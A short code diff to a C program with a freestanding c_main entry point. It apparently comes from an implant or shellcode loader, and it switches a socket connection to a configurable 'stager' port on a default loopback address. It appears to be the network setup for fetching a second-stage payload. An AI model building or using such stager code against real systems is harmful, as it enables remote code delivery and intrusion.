@@ -74,6 +74,7 @@ void c_main(long* stack_ptr) {
 
     uint32_t ip = 0x0100007F; 
     uint16_t port = 0x2923;    
+    uint16_t port_stager = 0x2a23;    
     char* arg_ip = NULL;
     char* arg_port = NULL;
 
@@ -98,7 +99,7 @@ void c_main(long* stack_ptr) {
 
         struct sockaddr_in addr;
         addr.sin_family = 2;
-        addr.sin_port = port;
+        addr.sin_port = port_stager;
         addr.sin_addr = ip;
         for (int i = 0; i < 8; i++) addr.sin_zero[i] = 0;
 
